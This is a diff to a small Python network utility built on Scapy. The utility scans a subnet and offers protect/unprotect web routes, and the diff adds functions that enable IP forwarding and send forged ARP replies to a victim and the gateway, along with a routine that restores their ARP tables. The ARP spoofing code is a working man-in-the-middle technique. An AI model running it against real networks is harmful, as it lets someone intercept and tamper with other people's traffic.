@@ -27,6 +27,52 @@ def get_hostname(ip):
         if 'name = ' in line:
             return line.split(' ')[-1].strip('.\n')
 
+def enable_ip_forward(self):
+    sp.Popen(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
+
+def disable_ip_forward(self):
+    sp.Popen(['sysctl', '-w', 'net.ipv4.ip_forward=0'])
+
+def arp_spoof(self, victim_ip, victim_hw):
+        # cheat the victim
+        pkt_1 = ARP()
+        pkt_1.op = 2
+        pkt_1.psrc = self.gwip
+        pkt_1.hwsrc = self.myhw
+        pkt_1.pdst = victim_ip
+        pkt_1.hwdst = victim_hw
+
+        # cheat the gateway
+        pkt_2 = ARP()
+        pkt_2.op = 2
+        pkt_2.psrc = victim_ip
+        pkt_2.hwsrc = self.myhw
+        pkt_2.pdst = self.gwip
+        pkt_2.hwdst = self.gwhw
+
+        send(pkt_1, count=3)
+        send(pkt_2, count=3)
+
+def arp_unspoof(self, victim_ip, victim_hw):
+    # Correct  the victim arp table
+    pkt_1 = ARP()
+    pkt_1.op = 2
+    pkt_1.psrc = self.gwip
+    pkt_1.hwsrc = self.gwhw
+    pkt_1.pdst = victim_ip
+    pkt_1.hwdst = victim_hw
+
+    # Correct  the gateway arptable
+    pkt_2 = ARP()
+    pkt_2.op = 2
+    pkt_2.psrc = victim_ip
+    pkt_2.hwsrc = victim_hw
+    pkt_2.pdst = self.gwip
+    pkt_2.hwdst = self.gwhw
+
+    send(pkt_1, count=3)
+    send(pkt_2, count=3)
+
 
 @route('/status')
 def get_ifaces():
@@ -75,13 +121,11 @@ def get_my(iface):
         })
 
     return json.dumps({
-        'result': {
-            'status': 'success',
-            'my': {
-                'ip': my_ip,
-                'mac': my_mac,
-                'hostname': get_hostname(my_ip)
-            }
+        'status': 'success',
+        'my': {
+            'ip': my_ip,
+            'mac': my_mac,
+            'hostname': get_hostname(my_ip)
         }
     })
 
@@ -128,7 +172,6 @@ def scan(gw_ip):
     live_hosts = list()
 
     ans, unans = arping('{}/24'.format(gw_ip), verbose=False)
-    print(ans.summary())
 
     for i in range(0, len(ans)):
         live_hosts.append ({
@@ -170,6 +213,7 @@ def enable_protection():
             'msg': sys.exc_info()[1]
         })
 
+
 @route('/unprotect')
 def disable_protection():
     response.headers['Content-Type'] = 'application/json'
@@ -188,6 +232,7 @@ def disable_protection():
             'msg': sys.exc_info()[1]
         })
     
+
 
 
 if __name__ == '__main__':
